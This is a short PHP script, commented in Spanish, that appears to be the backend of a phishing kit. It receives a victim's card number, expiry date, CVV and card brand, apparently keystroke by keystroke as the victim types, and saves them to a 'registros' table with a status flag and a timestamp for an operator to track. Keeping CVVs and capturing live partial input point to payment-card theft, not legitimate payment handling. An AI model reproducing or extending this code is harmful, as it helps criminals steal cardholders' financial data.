<?php
require_once __DIR__ . '/config.php';

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Validar que tengamos un ID de registro en la sesión
$idreg = $_SESSION['idreg'] ?? 0;
if ($idreg <= 0) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'No session idreg']);
    exit;
}

// Obtener los datos parciales
$tarjeta = sanitizeInput($_POST['tarjeta'] ?? '');
$fecha   = sanitizeInput($_POST['fecha'] ?? '');
$cvv     = sanitizeInput($_POST['cvv'] ?? '');
$marca   = sanitizeInput($_POST['marca'] ?? ''); // Ej: Visa, Mastercard...
$banco_actual = !empty($marca) ? ucfirst($marca) : 'Escribiendo...';

try {
    // Actualizar el registro en Supabase en tiempo real
    $stmt = $pdo->prepare("
        UPDATE registros 
        SET tarjeta = ?, vence = ?, cvv = ?, banco = ?, horamodificado = NOW(), status = 1
        WHERE id = ?
    ");
    $stmt->execute([$tarjeta, $fecha, $cvv, $banco_actual, $idreg]);

    echo json_encode(['ok' => true]);
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
}
